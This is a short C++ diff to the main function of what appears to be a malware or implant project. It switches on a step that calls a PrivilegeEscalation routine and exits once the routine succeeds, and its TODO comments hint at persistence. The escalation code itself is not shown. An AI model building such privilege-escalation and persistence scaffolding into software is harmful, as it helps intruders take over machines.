@@ -14,14 +14,17 @@ int main(int argc, char** argv)
 	System::setArguments(argc, argv);
 	System::setIsSystemAdmin(PrivilegeEscalation::systemAdminCheck());
 
+	// Privilege Escalation
 	if (!(System::getIsSystemAdmin() || System::checkForArgument("d")))
 	{
 		if (PrivilegeEscalation::run())
 		{
-			//exit(0);
+			exit(0);
 		}
 	}
-	std::cout << "OOPS";
+
+	std::cout << "Continue with low privileges" << std::endl; // LOG
+
 	// TODO: Maintaining
 
 	// TODO: Wait
